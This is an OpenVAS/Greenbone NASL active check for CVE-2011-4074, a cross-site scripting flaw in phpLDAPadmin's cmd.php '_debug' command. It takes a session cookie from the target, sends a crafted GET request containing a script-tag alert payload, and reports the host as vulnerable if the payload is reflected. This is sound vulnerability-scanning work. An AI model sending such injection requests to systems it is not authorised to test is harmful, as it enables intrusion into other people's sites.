# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:phpldapadmin_project:phpldapadmin";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802265");
  script_version("2024-12-24T05:05:31+0000");
  script_tag(name:"last_modification", value:"2024-12-24 05:05:31 +0000 (Tue, 24 Dec 2024)");
  script_tag(name:"creation_date", value:"2011-11-03 12:22:48 +0100 (Thu, 03 Nov 2011)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");

  script_cve_id("CVE-2011-4074");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("phpLDAPadmin '_debug' XSS Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_phpldapadmin_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("phpldapadmin/http/detected");

  script_tag(name:"summary", value:"phpLDAPadmin is prone to a cross-site scripting (XSS)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The flaw is due to improper validation of user-supplied input
  appended to the URL in cmd.php (when 'cmd' is set to '_debug'), which allows attackers to execute
  arbitrary HTML and script code in a user's browser session in the context of an affected site.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to insert
  arbitrary HTML and script code, which will be executed in a user's browser session in the context
  of an affected site.");

  script_tag(name:"affected", value:"phpLDAPadmin versions 1.2.0 through 1.2.1.1.");

  script_tag(name:"solution", value:"Updates are available. Please see the references for more
  info.");

  script_xref(name:"URL", value:"http://phpldapadmin.git.sourceforge.net/git/gitweb.cgi?p=phpldapadmin/phpldapadmin;a=commit;h=64668e882b8866fae0fa1b25375d1a2f3b4672e2");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/50331");
  script_xref(name:"URL", value:"http://secunia.com/advisories/46551");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/70918");
  script_xref(name:"URL", value:"http://openwall.com/lists/oss-security/2011/10/24/9");
  script_xref(name:"URL", value:"https://bugzilla.redhat.com/show_bug.cgi?id=748538");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if (dir == "/")
  dir = "";

req = http_get(port: port, item: dir + "/index.php");
res = http_keepalive_send_recv(port: port, data: req);

cookie = eregmatch(pattern: "Set-Cookie: ([^;]*);", string: res);
if (isnull(cookie[1]))
  exit(0);

cookie = cookie[1];

url = dir + "/cmd.php?cmd=_debug&<script>alert('OV-XSS-Attack-Test')</script>";

headers = make_array("Cookie", cookie);

req = http_get_req(port: port, url: url, add_headers: headers);
res = http_keepalive_send_recv(port: port, data: req);

if (res =~ "^HTTP/1\.[01] 200" && "<script>alert('OV-XSS-Attack-Test')</script>" >< res) {
  report = http_report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
